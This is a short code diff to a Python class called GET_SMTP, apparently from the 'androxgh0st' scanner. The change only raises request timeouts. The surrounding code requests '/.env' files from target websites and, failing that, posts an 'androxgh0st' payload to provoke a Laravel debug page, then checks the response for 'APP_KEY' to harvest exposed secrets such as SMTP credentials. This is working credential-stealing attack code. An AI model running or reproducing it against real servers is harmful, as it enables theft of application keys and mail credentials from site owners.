@@ -409,11 +409,11 @@ class GET_SMTP(object):
         try:
             text = '\033[32;1m#\033[0m '+url
             headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
-            get_source = requests.get(url+"/.env", headers=headers, timeout=15, verify=False, allow_redirects=False).text
+            get_source = requests.get(url+"/.env", headers=headers, timeout=30, verify=False, allow_redirects=False).text
             if "APP_KEY=" in get_source:
                 resp = get_source
             else:
-                get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=15, verify=False, allow_redirects=False).text
+                get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=30, verify=False, allow_redirects=False).text
                 if "<td>APP_KEY</td>" in get_source:
                     resp = get_source
             if resp:
